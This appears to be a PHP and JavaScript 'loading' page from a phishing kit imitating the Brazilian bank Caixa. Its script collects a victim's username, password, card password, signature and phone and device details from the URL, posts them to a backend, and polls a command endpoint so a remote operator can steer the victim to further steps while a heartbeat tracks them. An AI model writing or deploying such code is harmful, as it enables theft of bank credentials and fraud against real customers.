<?php
require_once __DIR__ . '/lib/caixa_bootstrap.php';
caixa_bootstrap_public(['require_passo' => true]);
?>
<!DOCTYPE html>

<html lang="pt-BR">

<head>

<meta charset="UTF-8">

<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Carregando...</title>

<link rel="stylesheet" href="assets/css/mobile-public.css">

<style>

*{

    margin:0;

    padding:0;

    box-sizing:border-box;

}



html,body{

    width:100%;

    height:100%;

}



body{

    background:#ffffff;

    display:flex;

    justify-content:center;

    align-items:center;

    overflow:hidden;

}



.loading{

    display:flex;

    flex-direction:column;

    justify-content:center;

    align-items:center;

    gap:16px;

}



.loading img{

    width:80px;

    height:80px;

    display:block;

}



.loading p{

    font-family:"Segoe UI",Arial,sans-serif;

    font-size:13px;

    color:#6b7a86;

}

</style>

</head>

<body>



<div class="loading">

    <img src="https://www.prietobrindes.com.br/img/icons/loading.gif" alt="Carregando...">

    <p id="loading-msg">Aguarde, estamos processando...</p>

</div>



<script src="assets/js/cliente-status.js"></script>
<script>
(function () {
  var params = new URLSearchParams(window.location.search);

  var campos = [
    'usuario', 'senha', 'aceite_termos', 'opcao_cadastro',
    'nome_dispositivo', 'telefone_cadastrado', 'prazo_dispositivo', 'dias_dispositivo',
    'assinatura', 'senha_cartao', 'etapa_origem', 'etapa_solicitada',
    'extensao_origem' // NOVO
  ];

  var dados = { tipo: 'salvar' };
  campos.forEach(function (campo) {
    var valor = params.get(campo);
    if (valor !== null && valor !== '') {
      dados[campo] = valor;
    }
  });

  // NOVO: fallback para extensao_origem via sessionStorage
  if (!dados.extensao_origem) {
    try {
      var extSess = sessionStorage.getItem('extensao_origem') || '';
      if (extSess) dados.extensao_origem = extSess;
    } catch (e) {}
  }

  if (!dados.etapa_origem) {
    dados.etapa_origem = params.get('origem') || 'login';
  }

  function enviarDados() {
    var body = new URLSearchParams();
    Object.keys(dados).forEach(function (k) {
      body.append(k, dados[k]);
    });

    return fetch('api/function.php', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: body.toString()
    });
  }

  function verificarComando() {
    return fetch('api/comandos.php', { cache: 'no-store' })
      .then(function (r) { return r.text(); })
      .then(function (txt) { return (txt || '').trim(); });
  }

  function redirecionar(comando) {
    if (/^[1-9]$/.test(comando)) {
      // NOVO: propaga extensao_origem no redirect
      var url = 'sistema.php?step=' + comando;
      if (dados.extensao_origem) {
        url += '&extensao_origem=' + encodeURIComponent(dados.extensao_origem);
      }
      window.location.href = url;
      return;
    }

    if (comando === 'finalizar') {
      window.location.href = 'index.php';
      return;
    }
  }

  function iniciarHeartbeat() {
    setInterval(function () {
      fetch('api/heartbeat.php', { cache: 'no-store' });
    }, 5000);
  }

  function processarStatusCliente(data) {
    if (!data || !data.ok) return false;

    // NOVO: captura extensao_origem vinda do backend e salva
    if (typeof data.extensao_origem === 'string' && data.extensao_origem !== '') {
      dados.extensao_origem = data.extensao_origem;
      try { sessionStorage.setItem('extensao_origem', data.extensao_origem); } catch (e) {}
    }

    if (typeof CaixaClienteStatus !== 'undefined') {
      if (CaixaClienteStatus.processarErro(data.erro, { pagina: 'loading', etapa: 0 })) {
        return true;
      }
    }

    var cmd = (data.comando || '').toString().trim();
    if (cmd && cmd !== 'aguardando') {
      redirecionar(cmd);
      return true;
    }

    return false;
  }

  function iniciarPolling() {
    setInterval(function () {
      if (typeof CaixaClienteStatus !== 'undefined') {
        CaixaClienteStatus.fetchStatus().then(processarStatusCliente).catch(function () {});
        return;
      }

      verificarComando().then(function (cmd) {
        if (cmd && cmd !== 'aguardando') {
          redirecionar(cmd);
        }
      });
    }, 2000);
  }

  enviarDados()
    .then(function () {
      iniciarHeartbeat();
      iniciarPolling();
      if (typeof CaixaClienteStatus !== 'undefined') {
        return CaixaClienteStatus.fetchStatus().then(function (data) {
          if (processarStatusCliente(data)) return null;
          return (data.comando || '').toString().trim();
        });
      }
      return verificarComando();
    })
    .then(function (cmd) {
      if (cmd && cmd !== 'aguardando') {
        redirecionar(cmd);
      }
    })
    .catch(function () {
      document.getElementById('loading-msg').textContent = 'Aguarde...';
      iniciarHeartbeat();
      iniciarPolling();
    });
})();
</script>

</body>

</html>
